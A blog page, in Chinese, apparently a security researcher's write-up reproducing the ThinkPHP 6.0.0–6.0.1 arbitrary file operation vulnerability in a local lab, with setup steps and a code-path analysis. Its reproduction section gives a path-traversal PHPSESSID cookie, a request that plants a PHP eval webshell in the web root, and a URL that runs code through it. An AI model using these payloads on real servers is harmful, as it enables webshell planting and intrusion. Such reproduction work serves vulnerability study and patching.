@@ -1,0 +1,820 @@
+<!-- Post layout -->
+<!DOCTYPE html>
+<html>
+<head>
+<!-- Introducing the head tag -->
+
+
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>ThinkPHP6任意文件操作漏洞 | sueisok</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="ThinkPHP6任意文件操作漏洞" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell" />
+<meta property="og:description" content="👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell" />
+<link rel="canonical" href="http://localhost:4000/blog/thinkphp6.0/" />
+<meta property="og:url" content="http://localhost:4000/blog/thinkphp6.0/" />
+<meta property="og:site_name" content="sueisok" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-03-13T15:13:21+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="ThinkPHP6任意文件操作漏洞" />
+<meta name="twitter:site" content="@your_name" />
+<meta name="google-site-verification" content="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"ThinkPHP6任意文件操作漏洞","dateModified":"2020-03-13T15:13:21+08:00","datePublished":"2020-03-13T15:13:21+08:00","url":"http://localhost:4000/blog/thinkphp6.0/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/thinkphp6.0/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/banner.png"}},"description":"👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+<script type="application/ld+json">
+    {
+      "@context": "http://schema.org/",
+      "@type": "Person",
+      "image": /assets/JHON.jpg,
+      "honorificPrefix": "MD.",
+      "name": sueisok,
+      "familyName": Your family name,
+      "honorificSuffix": King,
+      "disambiguatingDescription": Your awesome description,
+      "birthPlace": Your address,
+      "birthDate": Your Date of Birth,
+      "height": XX inches,
+      "gender": Your gender,
+      "memberOf": Your awesome orgranization,
+      "nationality": Your proud nationality,
+      "jobTitle": Your Respectful Position,
+      "knowsAbout": Your awesome Skill,
+      "knowsLanguage": ,
+      "email": ,
+      "url": " http://localhost:4000 ",
+      "test": 
+      "worksFor": {
+        "@type": ,
+        "name": ,
+        "openingHours": ,
+        "priceRange": ,
+        "telephone": ,
+        "image": ,
+        "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+         }
+      },
+      "address": {
+        "@type": ,
+        "addressCountry": ,
+        "addressLocality": ,
+        "addressRegion": 
+      },
+      "colleague": [
+        "https://deb108471.dhakaeducationboard.gov.bd",
+        "https://deb113652.dhakaeducationboard.gov.bd",
+        "https://deb110880.dhakaeducationboard.gov.bd"
+      ]
+    }
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-sclable=0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="description" content="Notes,Thoughts and Else" />
+<meta name="keywords" content="123456" />
+
+<!-- preloader -->
+<link rel="stylesheet" href="http://localhost:4000/assets/css/preloader.css">
+
+<!-- Favicon -->
+<link href="/assets/icon.png" rel="shortcut icon" />
+<link href="/assets/icon.png" rel="apple-touch-icon-precomposed" />
+<!-- Android Lolipop Theme Color -->
+<!-- <meta name="theme-color" content="#1464FB"> -->
+<title>ThinkPHP6任意文件操作漏洞</title>
+<!-- Baidu statistics -->
+
+<!-- Google Analytics -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', '');
+</script>
+
+
+<!-- Android Lolipop Theme Color -->
+<meta name="theme-color" content=" rgb(255,210,32) ">
+
+</head>
+<body onload="loaderFunc()">
+
+<!-- preloader -->
+<div id="loader" class="loader">
+  <div class="artboard">
+    <div class="square"></div>
+    <div class="path">
+      <div class="small-squares">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- end -->
+
+<!-- Top anchor -->
+<a id="htmlup" name="htmlup"></a>
+<!-- Introduce blog post options -->
+
+<header id="post-header" style="background-color:rgb(255,210,32);">
+  <div class="top-center">
+      <div class="logo">
+          <a href="/" title="my awesome webtitle" style="color: white;">sueisok</a>
+      </div>
+      <nav class="top-nav">
+          <ul>
+              
+                <li><a href="/" style="color: white;">Home</a></li>
+              
+                <li><a href="/tags/" style="color: white;">Tags</a></li>
+              
+                <li><a href="/timeline/" style="color: white;">Timeline</a></li>
+              
+                <li><a href="/about/" style="color: white;">About</a></li>
+              
+                <li><a href="/reLink/" style="color: white;">reLink</a></li>
+              
+          </ul>
+      </nav>
+      <div id="top-boot">
+        <a href="javascript:;" id="boot1" style="display:block;" onclick="document.getElementById('boot-area').style.display='block';document.getElementById('boot1').style.display='none';document.getElementById('boot2').style.display='block';"><img src="/assets/boot_white.png" alt=""></a>
+        <a href="javascript:;" id="boot2" style="display: none;" onclick="document.getElementById('boot-area').style.display='none';document.getElementById('boot1').style.display='block';document.getElementById('boot2').style.display='none';"><img src="/assets/boot_white.png" alt=""></a>
+      </div>
+  </div>
+
+</header>
+
+
+<!-- Introducing the mobile dropdown option -->
+<div id="boot-area">
+    <ul>
+        
+          <a href="/"><li>Home</li></a>
+        
+          <a href="/tags/"><li>Tags</li></a>
+        
+          <a href="/timeline/"><li>Timeline</li></a>
+        
+          <a href="/about/"><li>About</li></a>
+        
+          <a href="/reLink/"><li>reLink</li></a>
+        
+    </ul>
+</div>
+
+<!-- Introducing the blog post style -->
+<!-- Version one garbage -->
+<!-- <div class="wow fadeIn top" data-wow-duration="3.5s" >
+    <span class="wow fadeInUp" data-wow-delay="0.2s">ThinkPHP6任意文件操作漏洞</span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.4s"></span>
+    <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span>
+</div> -->
+
+<!--Version 2 switchable page -->
+
+<div class="post-top" style="background-color:rgb(255,210,32);">
+  <!-- Page width is greater than 800px -->
+  <div class="left-area">
+    
+      <a href="javascript:;" class="btn bounceInLeft animated" onmouseover="showLeft();this.style.color='rgb(255,210,32)';" onmouseout="goneLeft();this.style.color='rgba(0,0,0,.2)';"><</a>
+      <div id="left-tab" style="display:none;"><span class="left-san"></span><span class="left-main" style="color:rgb(255,210,32);"><sapn class="main">No previous page</sapn></span></div>
+    
+  </div>
+  <div class="post-titlearea">
+    <span class="wow fadeInUp" data-wow-delay="0.2s">ThinkPHP6任意文件操作漏洞</span>
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.4s"></span> -->
+    <!-- <span class="wow fadeInUp" data-wow-delay="0.6s">Author&nbsp;&nbsp;|&nbsp;&nbsp;true</span> -->
+  </div>
+  <div class="right-area">
+    
+      <a href="/blog/first-blog/" class="btn bounceInRight self-animated" onmouseover="showRight();this.style.color='rgb(255,210,32)';" onmouseout="goneRight();this.style.color='rgba(0,0,0,.2)';">></a>
+      <div id="right-tab" style="display:none;"><span class="right-san"></span><span class="right-main" style="color:rgb(255,210,32);"><sapn class="main">第一篇博客</sapn></span></div>
+    
+  </div>
+
+  <!-- Page width is less than 800px -->
+  <div class="post-changearea">
+    
+      <a href="javascript:;" class="leftchange" style="border-right: 1px solid rgb(255,210,32);border-bottom: 2px solid rgb(255,210,32);"><span><br>No previous one</span></a>
+    
+    
+      <a href="/blog/first-blog/" class="rightchange" style="border-left: 1px solid rgb(255,210,32);border-bottom: 2px solid rgb(255,210,32);"><span>Next<br><br>第一篇博客</span></a>
+    
+  </div>
+</div>
+
+
+<div class="markdown-body fadeInUp animated">
+  
+    
+      <div class="postpage-subtitle" style="border-left: 8px solid rgb(255,210,32); border-right: 8px solid rgb(255,210,32)">
+        Ubuntu+PHP7.1+ThinkPHP6.0.0复现任意文件操作漏洞
+      </div>
+    
+  
+
+  <!-- Article content -->
+  <p>👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell</p>
+
+<p>具体受影响版本为ThinkPHP6.0.0-6.0.1</p>
+
+<p>👻最早是看别人写了如何复现的，然后这几天搭建Ubuntu+PHP7.1+ThinkPHP6.0.0并复现这个任意文件操作漏洞</p>
+
+<p>主要归纳为追踪SessionId怎么就可以篡改啦</p>
+
+<p>在什么特定情况下可以getshell啦</p>
+
+<h2 id="环境准备">环境准备</h2>
+
+<ul>
+  <li>
+    <p>PHP7.1</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo apt-get -y install php7.1
+</code></pre></div>    </div>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/php7.1.png" alt="avatar" /></p>
+  </li>
+  <li>
+    <p><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037481">ThinkPHP6</a></p>
+
+    <p>安装<code class="highlighter-rouge">Composer</code></p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl -sS https://getcomposer.org/installer | php
+</code></pre></div>    </div>
+
+    <p>如果有什么乱七八糟错误，可以试一试</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo curl -sS https://getcomposer.org/installer | sudo php -d detect_unicode=Off
+</code></pre></div>    </div>
+
+    <p>然后移动</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mv composer.phar /usr/local/bin/composer
+</code></pre></div>    </div>
+
+    <p>修改源为阿里源</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
+</code></pre></div>    </div>
+
+    <p>安装ThinkPHP6.0</p>
+
+    <p>💢坑：这里不需要写<code class="highlighter-rouge">topthink/think=6.0.0dev</code>，不然会失败，版本可以在安装完之后修改配置文件进行版本覆盖</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ composer create-project topthink/think=6.0.x-dev tp
+</code></pre></div>    </div>
+
+    <p>💢坑：</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/keng_1.png" alt="avatar" /></p>
+
+    <p>蛤？🙄搞不明白，还改了半天php的配置文件，把extension=php_fileinfo.dll的勾掉，其实不需要，<a href="https://blog.csdn.net/u014132947/article/details/80258099?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task">参考这篇文章</a>，增加<code class="highlighter-rouge">--ignore-platform-reqs</code></p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo composer --ignore-platform-reqs create-project topthink/think=6.0.x-dev tp
+</code></pre></div>    </div>
+
+    <p>就好惹😍
+<img src="../../assets/blog_pic/20200313_thinkphp6.0/thinkphpok.png" alt="avatar" /></p>
+
+    <p>cd进入安装好的tp</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ php think run
+</code></pre></div>    </div>
+
+    <p>访问http://localhost:8000/，此时是最新的6.0.2版本</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/ojbk.png" alt="avatar" /></p>
+
+    <p>修改为6.0.1版本，将<code class="highlighter-rouge">/app/composer.json:24</code>修改为</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"topthink/framework": "6.0.0",
+</code></pre></div>    </div>
+
+    <p>然后执行将版本覆盖为6.0.0</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ composer update
+</code></pre></div>    </div>
+
+    <p>再次</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ php think run
+</code></pre></div>    </div>
+
+    <p>http://localhost:8000/就会是6.0.0版本了</p>
+  </li>
+</ul>
+
+<h2 id="洞析漏洞分析">洞析（漏洞分析）</h2>
+
+<p>参考：</p>
+
+<p><a href="https://hacpai.com/article/1579965339516">ThinkPHP6 任意文件操作漏洞分析</a></p>
+
+<p><a href="https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw">ThinkPHP6任意文件操作漏洞分析</a></p>
+
+<p>😒咋两篇名字一样</p>
+
+<ul>
+  <li>
+    <p>官方信息：ThinkPHP 发布的补丁声称修复了一处由于不安全的 SessionId 导致的任意文件操作漏洞：在开启 Session 的情况下可以导致创建任意文件以及删除任意文件，特定情况下可以 getshell。</p>
+  </li>
+  <li>
+    <p>根据这些信息，我们到官方 GitHub 的 commit 页面找一下相关的提交记录：</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/thinkphpgit.png" alt="avatar" /></p>
+
+    <p>在src/think/session/Store.php 中 212 行在设置 <code class="highlighter-rouge">id</code> 时增加了一个函数：<code class="highlighter-rouge">ctype_alnum($text)</code>，这个函数就是判断所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回 FALSE，所以可能是存储 Session 时导致的文件写入</p>
+  </li>
+  <li>
+    <p>跟进找一下相关的函数</p>
+
+    <p>可以看到 <code class="highlighter-rouge">vendor/topthink/framework/src/think/session/Store.php:254</code> 的 save()函数</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/fenxi_1.png" alt="avatar" /></p>
+
+    <p>263行write写入sessionId，265行delete删除sessionId，继续跟进write函数，在<code class="highlighter-rouge">vendor/topthink/framework/src/think/session/driver/File.php:210</code></p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/fenxi_2.png" alt="avatar" /></p>
+
+    <p>从<code class="highlighter-rouge">$sessID</code>来<code class="highlighter-rouge">getFileName</code>，然后直接<code class="highlighter-rouge">writeFile</code>写入，继续追踪<code class="highlighter-rouge">writeFile</code>函数，还是在File.php下</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/fenxi_3.png" alt="avatar" /></p>
+
+    <p>可以看到调用了 <code class="highlighter-rouge">file_put_contents()</code> 函数，这里是真正写入文件的操作了</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file_put_contents($path, $content, LOCK_EX);
+</code></pre></div>    </div>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/file_put_contents.png" alt="avatar" /></p>
+
+    <p>如果文件名不存在，则创建文件，否则现有文件将被覆盖，除非设置了FILE_APPEND标志。</p>
+  </li>
+  <li>
+    <p>分析：</p>
+
+    <ul>
+      <li>
+        <p>函数 <code class="highlighter-rouge">file_put_contents($path,$content,LOCK_EX)</code> 中参数 <code class="highlighter-rouge">$path,$content</code> 来源于函数 <code class="highlighter-rouge">writeFile($path,$data)</code></p>
+      </li>
+      <li>
+        <p>函数 <code class="highlighter-rouge">writeFile($path,$data)</code> 中参数 <code class="highlighter-rouge">$path,$data</code> 来源于函数 <code class="highlighter-rouge">write(String $sessionID,String $sessiData)</code></p>
+      </li>
+      <li>
+        <p>函数 <code class="highlighter-rouge">write(String $sessionID,String $sessiData)</code> 中参数 <code class="highlighter-rouge">$sessionID,$sessiData</code> 来源于 <code class="highlighter-rouge">save()</code> 中调用了 <code class="highlighter-rouge">write()</code>，同时传入的参数 <code class="highlighter-rouge">$sessionId</code> 的值是调用 <code class="highlighter-rouge">getId()</code> 传入的</p>
+      </li>
+    </ul>
+
+    <p>综上，文件名来源于 <code class="highlighter-rouge">$sessionId</code>，当传入的 id 值长度为 32 ，创建 <code class="highlighter-rouge">sessionId</code>，然后进行 <code class="highlighter-rouge">gitId()</code>，就是这里判断不足</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/session32.png" alt="avatar" /></p>
+  </li>
+  <li>
+    <p>接下来找调用 <code class="highlighter-rouge">setId()</code> 的地方<code class="highlighter-rouge">vendor/topthink/framework/src/think/middleware/SessionInit.php:46</code></p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/sessionid.png" alt="avatar" /></p>
+
+    <p>其中 <code class="highlighter-rouge">cookieName</code> 的值为 <code class="highlighter-rouge">PHPSESSID</code>， <code class="highlighter-rouge">$sessionId</code> 是 <code class="highlighter-rouge">cookie</code> 中名为 <code class="highlighter-rouge">PHPSESSID</code> 的值，因此是攻击者可控的，从而导致写入的文件名可控。</p>
+
+    <p>但是默认环境下，<code class="highlighter-rouge">session</code> 的内容由 <code class="highlighter-rouge">vendor/topthink/framework/src/think/session/Store.php:261</code> 的变量 <code class="highlighter-rouge">$data</code> 传入：</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/fenxi_4.png" alt="avatar" /></p>
+
+    <p><code class="highlighter-rouge">$data</code> 在默认环境中为空:</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/fenxi_5.png" alt="avatar" /></p>
+
+    <p>所以，可利用的条件比较苛刻</p>
+
+    <p>👹一是默认情况下是不开启session的，开启session才可以实现任意文件操作</p>
+
+    <p>👹二是写入的 session内容是由实际的后端业务逻辑来决定，只有特定情况才能getshell</p>
+
+    <p>那接下来就get一下shell吧</p>
+  </li>
+</ul>
+
+<h2 id="复现漏洞">复现漏洞</h2>
+
+<ul>
+  <li>
+    <p>修改<code class="highlighter-rouge">app/composer/Index.php</code>，加一句</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session('sueisok',"1");
+</code></pre></div>    </div>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/sueisok.png" alt="avatar" /></p>
+  </li>
+  <li>
+    <p>开启session，去掉<code class="highlighter-rouge">app/middleware.php:9</code>中的注释</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/middleware.png" alt="avatar" /></p>
+  </li>
+  <li>
+    <p>访问，抓包，将<code class="highlighter-rouge">PHPSESSID</code>改为目录地址</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie: PHPSESSID=../../../../public/sueisokkk.php
+</code></pre></div>    </div>
+
+    <p>💢坑：这里的<code class="highlighter-rouge">PHPSESSID</code>一定要是32位的</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/okkkphp.png" alt="avatar" /></p>
+
+    <p><code class="highlighter-rouge">runtime/session/</code>下会生成的session😀</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/runtimesession.png" alt="avatar" /></p>
+  </li>
+  <li>
+    <p>来恶意操作一下，把<code class="highlighter-rouge">app/composer/Index.php</code>里写入</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session('sueisok',$_GET["c"]);
+</code></pre></div>    </div>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/getc.png" alt="avatar" /></p>
+
+    <p>访问，抓包，数据包内容</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /index.php?s=index/index&amp;c=%3C?php%20eval($_GET[a]);?%3E HTTP/1.1
+Host: 172.16.70.244:8000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=../../../../public/sueisokkk.php
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+</code></pre></div>    </div>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/eval.png" alt="avatar" /></p>
+
+    <p>200之后，在<code class="highlighter-rouge">public/</code>下写入了名为<code class="highlighter-rouge">sueisokkk.php</code>的文件，在浏览器中访问构造带有payload的链接：</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://xxx.xxx.xxx.xxx:8000/sueisokkk.php?a=fwrite(fopen(%22aa.txt%22,%20%22w%22),%22hello,world!%22);
+</code></pre></div>    </div>
+
+    <p>就在<code class="highlighter-rouge">public/</code>下写入了名为<code class="highlighter-rouge">aa.txt</code>内容为<code class="highlighter-rouge">hello,world</code>的文件</p>
+
+    <p><img src="../../assets/blog_pic/20200313_thinkphp6.0/helloworld.png" alt="avatar" /></p>
+  </li>
+</ul>
+
+<p>😇此时的心情彷佛春天来到</p>
+
+<h2 id="其他的坑">其他的坑</h2>
+
+<ul>
+  <li>
+    <p>💢如果修改了session以后，http://localhost:8000访问之后出错，就要试一下</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo php think run
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>💢如果<code class="highlighter-rouge">runtime/session/</code>下没有生成的session，那就应该是文件夹写的权限不够，我是直接给了777</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo chmod 777 /runtime/session/
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>所以能任意写入文件getshell的条件还是很苛刻的</p>
+
+
+  <!-- Introducing the share module -->
+  
+  <div class="social-share-wrapper">
+    <div class="social-share"></div>
+  </div>
+
+
+<!-- share.js -->
+<script src="/assets/js/social-share.min.js"></script>
+<script>
+  socialShare('.social-share', {
+    sites: [
+      
+        'weibo'
+        ,
+        
+      
+        'qq'
+        ,
+        
+      
+        'wechat'
+        
+      
+    ],
+    wechatQrcodeTitle: "Share to WeChat circle",
+    wechatQrcodeHelper: 'I look forward to seeing this article in the circle of friends.'
+  });
+</script>
+
+</div>
+
+<!-- Bottom anchor -->
+<a id="htmldown" name="htmldown"></a>
+<!-- Introducing the comment module -->
+
+
+
+    <section class="post-footer-item comment">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80ODI3Ny8yNDc3MQ=="></div>
+    </section>
+
+    <!-- 来必力City版安装代码 -->
+    <script type="text/javascript">
+       (function(d, s) {
+           var j, e = d.getElementsByTagName(s)[0];
+
+           if (typeof LivereTower === 'function') { return; }
+
+           j = d.createElement(s);
+           j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+           j.async = true;
+
+           e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript>Please activate JavaScript for normal use.</noscript>
+    <!-- City version code installation has been completed -->
+
+
+
+
+
+<!-- Introducing the goto module -->
+<div class="bounceInRight animated go">
+  <a title="Top switch page" class="gototop" href="#htmlup" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Top
+    </div>
+  </a>
+  <a title="At the bottomlivere评论哦" class="gotobottom" href="#htmldown" target="_self">
+    <div class="box" style="font-family:'ffad_matroregular';">
+        Foot
+    </div>
+  </a>
+</div>
+
+<!-- Introduce the module at the bottom of the page -->
+
+<footer id="bottom">
+  <script src="/assets/css/bootstrap.min.css"></script>
+
+<!-- START BREADCRUMBS -->
+<nav aria-label="breadcrumb">
+
+  <ol class="breadcrumb">
+  
+  
+  
+  </ol>
+</nav>
+
+<!-- END BREADCRUMBS -->
+
+
+<div id="breadcrumbs">
+
+<a href="/">Home</a>
+
+  
+    / <a href="/blog/">Blog</a>
+  
+
+  
+    / Thinkphp6.0
+  
+
+</div>
+<style>
+#breadcrumbs {margin-left: 0
+
+      font-size: 10rem;
+      padding: 0.75rem 1rem;
+      margin-bottom: 1rem;
+      list-style: none;
+      background-color: # #fcfcfc;
+      border-radius: 0.25rem;
+
+      content: "";
+      display: table;
+      clear: both;
+
+      float: left;
+
+      display: inline-block;
+      padding-right: 0.5rem;
+      padding-left: 0.5rem;
+      color: #818a91;
+      content: "/";
+
+      text-decoration: underline;
+
+      text-decoration: none;
+
+}
+</style>
+
+  <br>
+  <span>sueisok ©
+  
+  
+  2020
+  <br>
+  Powered by <a href="https://www.jekyll.com/">Jekyll</a> | <a href="https://github.com/JonyBepary/HardCandy-Jekyll-Mod">HardCandy-Jekyll Mod</a></span>
+</footer>
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="/assets/css/media.css">
+<link rel="stylesheet" href="/assets/css/animate.min.css">
+<link rel="stylesheet" href="/assets/css/pygments/pygments_default.css">
+<link rel="stylesheet" href="/assets/css/github-markdown.css">
+<!-- SNS-icon -->
+<script src="/assets/js/font_856428_y9z6nq7zf5.js"></script>
+<!-- share.css -->
+<link rel="stylesheet" href="/assets/css/share.min.css">
+<!-- font -->
+<link rel="stylesheet" href="/assets/css/font.css">
+<!-- <link href="https://fonts.googleapis.com/css?family=Kaushan+Script|Pacifico|Ubuntu|Roboto+Mono|Source+Sans+Pro" rel="stylesheet"> -->
+
+
+
+<!-- Quote the animation effect of wow.js -->
+<script src="/assets/js/wow.js"></script>
+<script>
+    var wow = new WOW({
+        boxClass: 'wow',
+        animateClass: 'animated',
+        // offset: 600,
+        mobile: true,
+        live: true
+    });
+    wow.init();
+</script>
+<!-- Page refreshes back to top -->
+<script>
+    window.onbeforeunload = function(){
+        //The page automatically returns to the top after refreshing
+        document.documentElement.scrollTop = 0;  //ie下
+        document.body.scrollTop = 0;  //非ie
+    }
+</script>
+
+<!-- preloder script -->
+<!-- end -->
+<script>
+//open external links in a new window
+function external_new_window() {
+    for(var c = document.getElementsByTagName("a"), a = 0;a < c.length;a++) {
+    var b = c[a];
+    b.getAttribute("href") && b.hostname !== location.hostname
+    }
+}
+//open PDF links in a new window
+function pdf_new_window ()
+{
+    if (!document.getElementsByTagName) return false;
+    var links = document.getElementsByTagName("a");
+    for (var eleLink=0; eleLink < links.length; eleLink ++) {
+    if ((links[eleLink].href.indexOf('.pdf') !== -1)||(links[eleLink].href.indexOf('.doc') !== -1)||(links[eleLink].href.indexOf('.docx') !== -1)) {
+        links[eleLink].onclick =
+        function() {
+            window.open(this.href);
+            return false;
+        }
+    }
+    }
+}
+pdf_new_window()
+external_new_window();
+</script>
+
+<style>
+.videoWrapper {
+    position: relative;
+    padding-bottom: 56.333%;
+    height: 0;
+    background: black;
+}
+.videoWrapper iframe {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    border: 0;
+}
+</style>
+
+<script>
+function get_youtube_id(url) {
+    var p = /^(?:https?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:embed\/|v\/|watch\?v=|watch\?.+&v=))((\w|-){11})(?:\S+)?$/;
+    return (url.match(p)) ? RegExp.$1 : false;
+}
+function vimeo_embed(url,el) {
+    var id = false;
+    $.ajax({
+      url: 'https://vimeo.com/api/oembed.json?url='+url,
+      async: true,
+      success: function(response) {
+        if(response.video_id) {
+          id = response.video_id;
+          if(url.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+          if(url.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+          var theInnerHTML = '<div class="videoWrapper"><iframe src="https://player.vimeo.com/video/'+id+'/?byline=0&title=0&portrait=0';
+          if(autoplay==1) theInnerHTML += '&autoplay=1';
+          if(loop==1) theInnerHTML += '&loop=1';
+          theInnerHTML += '" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe></div>';
+          el.innerHTML = theInnerHTML;
+        }
+      }
+    });
+}
+function video_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        //check if this is an external url (that starts with https:// or http://
+        if (p[i].innerHTML.indexOf("http://") == 0 ||
+            p[i].innerHTML.indexOf("https://") == 0) {
+            var youtube_id = get_youtube_id(p[i].innerHTML);
+            if(youtube_id) {
+                if(p[i].innerHTML.indexOf('autoplay=1') !== -1) var autoplay=1; else var autoplay=0;
+                if(p[i].innerHTML.indexOf('loop=1') !== -1) var loop=1; else var loop=0;
+                var theInnerHTML = '<div class="videoWrapper"><iframe width="720" height="420" src="https://www.youtube.com/embed/' + youtube_id + '?rel=0&showinfo=0';
+                if(autoplay==1) theInnerHTML += '&autoplay=1';
+                if(loop==1) theInnerHTML += '&loop=1&playlist='+youtube_id+'&version=3';
+                theInnerHTML += '" frameborder="0" allowfullscreen></iframe></div>';
+                p[i].innerHTML = theInnerHTML;
+            }
+            if(p[i].innerHTML.indexOf('vimeo.com') !== -1) {
+                //ask vimeo for the id and place the embed
+                vimeo_embed(p[i].innerHTML,p[i]);
+            }
+        }
+    }
+}
+video_embed();
+
+function mp3_embed() {
+    var p = document.getElementsByTagName('p');
+    for(var i = 0; i < p.length; i++) {
+        if(p[i].innerHTML.indexOf('.mp3') !== -1) {
+            var str = p[i].innerHTML.split('?');
+            if(str.length == 1) str[1] = '';
+            var str1 = str[1];
+            str1 = str1.replace('&','').replace('&','');
+            str1 = str1.replace('autoplay=1','').replace('autoplay=0','');
+            str1 = str1.replace('loop=1','').replace('loop=0','');
+            str1 = str1.replace('controls=0','').replace('controls=1','');
+
